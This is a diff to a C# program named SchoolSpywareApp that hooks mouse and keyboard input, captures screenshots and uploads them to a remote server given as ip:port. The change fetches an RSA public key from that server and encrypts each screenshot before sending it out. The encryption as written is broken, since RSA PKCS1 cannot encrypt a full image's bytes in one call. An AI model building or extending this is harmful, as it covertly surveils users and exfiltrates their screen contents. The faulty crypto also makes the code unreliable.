@@ -1,26 +1,27 @@
-﻿using SchoolLibrary;
-using System;
-using System.Linq;
+﻿using System.Drawing;
+using System.Drawing.Imaging;
+using System.Net.Http.Headers;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Windows.Forms;
 using Gma.System.MouseKeyHook;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.IO;
-using System.Net.Http;
-using System.Net.Http.Headers;
-using System.Net.NetworkInformation;
 using Newtonsoft.Json;
+using SchoolLibrary;
 
 namespace SchoolSpywareApp
 {
     internal class Program
     {
         private static HttpClient _httpClient = new HttpClient();
+        private static RSA _rsa = RSA.Create();
 
-        static void Main(string[] args)
+        static async Task Main(string[] args)
         {
-            if(args.Length != 2 || !args[0].Contains(':'))
+            RSACryptoServiceProvider.UseMachineKeyStore = true;
+            DSACryptoServiceProvider.UseMachineKeyStore = true;
+
+            if (args.Length != 2 || !args[0].Contains(':'))
             {
                 string programName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
                 Console.WriteLine("Usage: {0} <ip>:<port>", programName);
@@ -32,6 +33,8 @@ namespace SchoolSpywareApp
             
             string ipAddress = fields[0];
             int port = Int32.Parse(fields[1]);
+            
+            _rsa.ImportFromPem(await GetPublicKeyPem(ipAddress, port));
 
             UriBuilder uriBuilder = new UriBuilder
             {
@@ -72,6 +75,8 @@ namespace SchoolSpywareApp
                 imageBytes = memoryStream.ToArray();
             }
 
+            imageBytes = _rsa.Encrypt(imageBytes, RSAEncryptionPadding.Pkcs1);
+
             ByteArrayContent imageContent = new ByteArrayContent(imageBytes);
 
             MultipartFormDataContent multipartContent = new MultipartFormDataContent();
@@ -82,6 +87,23 @@ namespace SchoolSpywareApp
 
             Console.WriteLine(response);
             Console.WriteLine(await response.Content.ReadAsStringAsync());
+        }
+
+        private static async Task<string> GetPublicKeyPem(string ipAddress, int port)
+        {
+            UriBuilder uriBuilder = new UriBuilder
+            {
+                Scheme = "http",
+                Host = ipAddress,
+                Port = port,
+                Path = "api/rsakey"
+            };
+            var response = await _httpClient.GetAsync(uriBuilder.Uri);
+            var publicKeyPem = await response.Content.ReadAsStringAsync();
+
+            Console.WriteLine(publicKeyPem);
+
+            return publicKeyPem;
         }
     }
 }
